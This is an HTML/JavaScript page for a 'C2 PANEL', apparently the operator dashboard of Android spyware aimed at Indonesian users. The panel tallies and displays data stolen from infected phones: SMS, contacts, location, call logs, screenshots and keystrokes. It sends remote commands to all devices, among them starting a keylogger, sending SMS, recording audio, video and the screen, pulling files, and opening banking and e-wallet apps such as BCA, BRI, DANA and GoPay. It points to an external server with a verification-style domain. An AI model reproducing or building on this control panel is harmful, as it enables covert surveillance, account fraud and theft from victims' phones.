<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>C2 PANEL</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#050a12;color:#b8d4e3;font-family:'JetBrains Mono',monospace;font-size:13px}
        .container{max-width:1600px;margin:0 auto;padding:10px}
        .login-container{max-width:400px;margin:70px auto;background:#0a1628;padding:40px;border-radius:12px;border:1px solid #1a2a4a;text-align:center}
        .login-container input{width:100%;padding:12px;border-radius:6px;border:1px solid #1a2a4a;background:#050a12;color:#fff;margin-bottom:12px}
        .login-container button{width:100%;padding:12px;border-radius:6px;background:#0d1a2b;color:#00ff88;border:1px solid #1a2a4a;cursor:pointer}
        .hidden{display:none}
        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(80px,1fr));gap:4px;margin-bottom:10px}
        .stat-card{background:#0d1a2b;padding:6px;border-radius:4px;border:1px solid #1a2a4a;text-align:center}
        .stat-card .num{font-size:16px;font-weight:800;color:#00ff88}
        .stat-card .label{font-size:7px;color:#4a6a8a}
        .tabs{display:flex;gap:2px;margin-bottom:10px;background:#0a1628;padding:4px;border-radius:6px;border:1px solid #1a2a4a}
        .tab{background:transparent;padding:6px 14px;border-radius:4px;cursor:pointer;border:none;color:#4a6a8a;font-size:10px}
        .tab.active{background:#050a12;color:#00ff88}
        .panel{display:none;background:#0a1628;border-radius:6px;padding:12px;border:1px solid #1a2a4a}
        .panel.active{display:block}
        .table-wrap{overflow-x:auto;max-height:480px;overflow-y:auto}
        table{width:100%;border-collapse:collapse;font-size:10px}
        th{background:#050a12;padding:5px 8px;text-align:left;color:#4fc3f7;border-bottom:2px solid #1a2a4a;position:sticky;top:0}
        td{padding:4px 8px;border-bottom:1px solid rgba(255,255,255,0.02)}
        .cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:4px}
        .cmd-btn{background:#050a12;padding:4px 6px;border-radius:4px;border:1px solid #1a2a4a;color:#b8d4e3;cursor:pointer;text-align:center;font-size:9px}
        .cmd-btn:hover{border-color:#00ff88}
        .cmd-btn.danger{border-color:#3a1a2a;color:#ff4455}
        .cmd-btn.success{border-color:#1a3a2a;color:#4caf50}
        .log-area{background:#050a12;border-radius:4px;padding:8px;height:260px;overflow-y:auto;font-size:9px;border:1px solid #1a2a4a;font-family:monospace}
        #map{height:280px;border-radius:4px;border:1px solid #1a2a4a}
        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:1000;justify-content:center;align-items:center}
        .modal.active{display:flex}
        .modal-content{background:#0a1628;padding:20px;border-radius:8px;max-width:650px;width:94%;border:1px solid #1a2a4a}
        .modal-close{float:right;background:transparent;border:none;color:#4a6a8a;font-size:18px;cursor:pointer}
    </style>
</head>
<body>

<div id="loginContainer" class="login-container">
    <div style="font-size:24px;font-weight:800;color:#00ff88;margin-bottom:10px">☠️ C2 PANEL</div>
    <input type="password" id="loginPassword" placeholder="Master Key" onkeydown="if(event.key==='Enter')login()">
    <button onclick="login()">🔓 ACCESS</button>
    <div id="loginError" style="color:#ff4455;margin-top:10px;display:none">Invalid</div>
</div>

<div id="dashboardContent" class="hidden">
    <div class="container">
        <div style="display:flex;justify-content:space-between;background:#0a1628;padding:8px 16px;border-radius:8px;border:1px solid #1a2a4a;margin-bottom:10px">
            <div>☠️ C2 PANEL</div>
            <div><span id="deviceCount">0</span> Devices | <button onclick="logout()" style="background:transparent;border:1px solid #3a1a2a;color:#ff4455;padding:2px 12px;border-radius:4px;cursor:pointer">Logout</button></div>
        </div>

        <div class="stats" id="statsContainer">
            <div class="stat-card"><div class="num" id="statTotal">0</div><div class="label">Total</div></div>
            <div class="stat-card"><div class="num" id="statDevices">0</div><div class="label">Devices</div></div>
            <div class="stat-card"><div class="num" id="statSMS">0</div><div class="label">SMS</div></div>
            <div class="stat-card"><div class="num" id="statContacts">0</div><div class="label">Contacts</div></div>
            <div class="stat-card"><div class="num" id="statLocation">0</div><div class="label">Location</div></div>
            <div class="stat-card"><div class="num" id="statCallLog">0</div><div class="label">Call Log</div></div>
            <div class="stat-card"><div class="num" id="statScreenshot">0</div><div class="label">Screenshot</div></div>
            <div class="stat-card"><div class="num" id="statKeylogger">0</div><div class="label">Keylogger</div></div>
            <div class="stat-card"><div class="num" id="statFiles">0</div><div class="label">Files</div></div>
            <div class="stat-card"><div class="num" id="statC2">0</div><div class="label">C2 Exec</div></div>
        </div>

        <div class="tabs">
            <div class="tab active" onclick="showPanel('data')">📊 Data</div>
            <div class="tab" onclick="showPanel('map')">🗺️ Map</div>
            <div class="tab" onclick="showPanel('c2')">⚡ C2</div>
            <div class="tab" onclick="showPanel('logs')">📋 Logs</div>
            <div class="tab" onclick="showPanel('media')">📸 Media</div>
            <div class="tab" onclick="showPanel('files')">📁 Files</div>
        </div>

        <div class="panel active" id="panelData">
            <div style="display:flex;gap:8px;margin-bottom:8px">
                <input type="text" id="searchInput" placeholder="Search..." oninput="filterData()" style="flex:1;padding:4px 8px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#fff">
                <select id="filterType" onchange="filterData()" style="padding:4px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#fff">
                    <option value="">All</option>
                    <option value="sms">SMS</option>
                    <option value="kontak">Contacts</option>
                    <option value="lokasi">Location</option>
                    <option value="screenshot">Screenshot</option>
                    <option value="keylogger">Keylogger</option>
                </select>
                <button onclick="refreshData()" style="padding:4px 10px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#fff;cursor:pointer">Refresh</button>
            </div>
            <div class="table-wrap">
                <table><thead><tr><th>Time</th><th>Source</th><th>Data</th><th>Device</th></tr></thead><tbody id="dataTableBody"></tbody></table>
            </div>
        </div>

        <div class="panel" id="panelMap">
            <div id="map"></div>
        </div>

        <div class="panel" id="panelC2">
            <div id="cmdContainer" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:4px"></div>
            <div style="margin-top:8px;display:flex;gap:4px">
                <input type="text" id="customCmd" placeholder="Custom command..." style="flex:1;padding:4px 8px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#fff">
                <input type="text" id="customParam" placeholder="Param" style="flex:0.3;padding:4px 8px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#fff">
                <button onclick="sendCustomCommand()" style="padding:4px 10px;border-radius:4px;border:1px solid #1a2a4a;background:#050a12;color:#00ff88;cursor:pointer">Send</button>
            </div>
        </div>

        <div class="panel" id="panelLogs">
            <div class="log-area" id="logArea"></div>
        </div>

        <div class="panel" id="panelMedia">
            <div id="mediaGallery" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:6px"></div>
        </div>

        <div class="panel" id="panelFiles">
            <div id="fileList"></div>
        </div>
    </div>
</div>

<div class="modal" id="modal"><div class="modal-content"><button class="modal-close" onclick="closeModal()">×</button><div id="modalBody"></div></div></div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
// ============================================================
// DASHBOARD - REAL
// ============================================================

var PASSWORD = '';
var allData = [];
var logEntries = [];
var map = null;
var SERVER = 'https://verifikasi.site';

function login() {
    var p = document.getElementById('loginPassword').value.trim();
    if (!p) return;
    PASSWORD = p;
    document.getElementById('loginContainer').style.display = 'none';
    document.getElementById('dashboardContent').classList.remove('hidden');
    initDashboard();
}

function logout() {
    PASSWORD = '';
    document.getElementById('dashboardContent').classList.add('hidden');
    document.getElementById('loginContainer').style.display = 'block';
}

function initDashboard() {
    refreshData();
    renderC2Commands();
    setTimeout(initMap, 1000);
    setInterval(refreshData, 15000);
    addLog('System initialized');
}

function showPanel(id) {
    document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
    document.getElementById('panel'+id.charAt(0).toUpperCase()+id.slice(1)).classList.add('active');
    document.querySelector('.tab[onclick="showPanel(\''+id+'\')"]').classList.add('active');
}

function refreshData() {
    fetch('/data', { headers: { 'X-Password': PASSWORD } })
        .then(r=>r.json())
        .then(data=>{
            if (data && data.data) {
                allData = data.data;
                renderData(allData);
                updateStats(allData);
            }
        })
        .catch(()=>{});
}

function renderData(data) {
    var tbody = document.getElementById('dataTableBody');
    tbody.innerHTML = '';
    data.slice(0, 100).forEach(item=>{
        var tr = document.createElement('tr');
        var time = new Date(item.waktu).toLocaleString();
        var dataStr = typeof item.data === 'object' ? JSON.stringify(item.data).substring(0, 50) : (item.data||'').substring(0, 50);
        tr.innerHTML = '<td>'+time+'</td><td>'+item.sumber+'</td><td>'+dataStr+'</td><td>'+(item.device||item.ip||'-')+'</td>';
        tbody.appendChild(tr);
    });
}

function updateStats(data) {
    var stats = { total: data.length, sms:0, kontak:0, lokasi:0, call_log:0, screenshot:0, keylogger:0, files:0, c2:0 };
    var devices = new Set();
    data.forEach(item=>{
        var s = item.sumber||'';
        if (s.includes('sms')) stats.sms++;
        else if (s.includes('kontak')) stats.kontak++;
        else if (s.includes('lokasi')) stats.lokasi++;
        else if (s.includes('call_log')) stats.call_log++;
        else if (s.includes('screenshot')) stats.screenshot++;
        else if (s.includes('keylogger')) stats.keylogger++;
        else if (s.includes('file')) stats.files++;
        else if (s.includes('c2') || s.includes('command')) stats.c2++;
        if (item.ip) devices.add(item.ip);
        if (item.device) devices.add(item.device);
    });
    document.getElementById('statTotal').textContent = stats.total;
    document.getElementById('statDevices').textContent = devices.size;
    document.getElementById('statSMS').textContent = stats.sms;
    document.getElementById('statContacts').textContent = stats.kontak;
    document.getElementById('statLocation').textContent = stats.lokasi;
    document.getElementById('statCallLog').textContent = stats.call_log;
    document.getElementById('statScreenshot').textContent = stats.screenshot;
    document.getElementById('statKeylogger').textContent = stats.keylogger;
    document.getElementById('statFiles').textContent = stats.files;
    document.getElementById('statC2').textContent = stats.c2;
}

function filterData() { renderData(allData); }

// C2 Commands (48 perintah)
var C2_COMMANDS = [
    { id: 'ambil_kontak', label: '📇 Contacts' },
    { id: 'ambil_sms', label: '💬 SMS' },
    { id: 'ambil_call_log', label: '📞 Call Log' },
    { id: 'ambil_lokasi', label: '📍 Location' },
    { id: 'get_clipboard', label: '📋 Clipboard' },
    { id: 'set_clipboard', label: '📋 Set Clipboard', param: 'text' },
    { id: 'ambil_imei', label: '📱 IMEI' },
    { id: 'ambil_imsi', label: '📱 IMSI' },
    { id: 'ambil_nomor_hp', label: '📱 Phone' },
    { id: 'get_installed_apps', label: '📱 Apps' },
    { id: 'get_notifications', label: '🔔 Notifs' },
    { id: 'clear_all_notifications', label: '🗑️ Clear All' },
    { id: 'keylogger_start', label: '▶️ Keylogger' },
    { id: 'keylogger_stop', label: '⏹️ Stop' },
    { id: 'keylogger_upload', label: '📤 Upload' },
    { id: 'kirim_sms', label: '📨 Send SMS', param: 'number|message' },
    { id: 'call_number', label: '📞 Call', param: 'number' },
    { id: 'buka_aplikasi', label: '📱 Open App', param: 'package' },
    { id: 'uninstall_aplikasi', label: '🗑️ Uninstall', param: 'package' },
    { id: 'buka_dana', label: '💰 DANA' },
    { id: 'buka_gopay', label: '💰 GoPay' },
    { id: 'buka_ovo', label: '💰 OVO' },
    { id: 'buka_bri', label: '🏦 BRI' },
    { id: 'buka_bca', label: '🏦 BCA' },
    { id: 'screenshot', label: '📸 Screenshot' },
    { id: 'record_audio', label: '🎤 Record Audio', param: 'durasi' },
    { id: 'stop_audio', label: '⏹️ Stop Audio' },
    { id: 'record_video', label: '🎥 Record Video', param: 'durasi' },
    { id: 'stop_video', label: '⏹️ Stop Video' },
    { id: 'screen_record', label: '📹 Screen Rec', param: 'durasi' },
    { id: 'screen_record_stop', label: '⏹️ Stop' },
    { id: 'list_file', label: '📂 List Files', param: 'path' },
    { id: 'ambil_file', label: '📄 Get File', param: 'path' },
    { id: 'get_system_info', label: '📊 System Info' },
    { id: 'get_battery', label: '🔋 Battery' },
    { id: 'get_wifi', label: '📶 WiFi' },
    { id: 'vibrate', label: '📳 Vibrate', param: 'ms' },
    { id: 'toast', label: '💬 Toast', param: 'msg' },
    { id: 'buka_url', label: '🌐 Open URL', param: 'url' }
];

function renderC2Commands() {
    var container = document.getElementById('cmdContainer');
    container.innerHTML = '';
    C2_COMMANDS.forEach(cmd=>{
        var btn = document.createElement('div');
        btn.className = 'cmd-btn';
        btn.textContent = cmd.label;
        btn.onclick = function() {
            var param = cmd.param || '';
            if (param) {
                var p = prompt('Parameter untuk '+cmd.label+' ('+param+'):');
                if (p !== null) sendC2Command(cmd.id, p);
            } else {
                sendC2Command(cmd.id, '');
            }
        };
        container.appendChild(btn);
    });
}

function sendC2Command(cmd, param) {
    var data = { command: cmd, target: 'all', timestamp: Date.now() };
    if (param) data.param = param;
    fetch('/c2', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Password': PASSWORD },
        body: JSON.stringify(data)
    }).then(r=>r.json()).then(d=>{
        addLog('Command sent: '+cmd);
    }).catch(()=>{ addLog('Command failed'); });
}

function sendCustomCommand() {
    var cmd = document.getElementById('customCmd').value.trim();
    var param = document.getElementById('customParam').value.trim();
    if (!cmd) return;
    sendC2Command(cmd, param);
    document.getElementById('customCmd').value = '';
    document.getElementById('customParam').value = '';
}

function addLog(msg) {
    logEntries.push('['+new Date().toLocaleTimeString()+'] '+msg);
    var area = document.getElementById('logArea');
    area.innerHTML = logEntries.slice(-100).join('\n');
}

function initMap() {
    if (map) { map.remove(); map=null; }
    map = L.map('map', { center: [-6.2088, 106.8456], zoom: 5 });
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
}

function closeModal() { document.getElementById('modal').classList.remove('active'); }
</script>
</body>
</html>
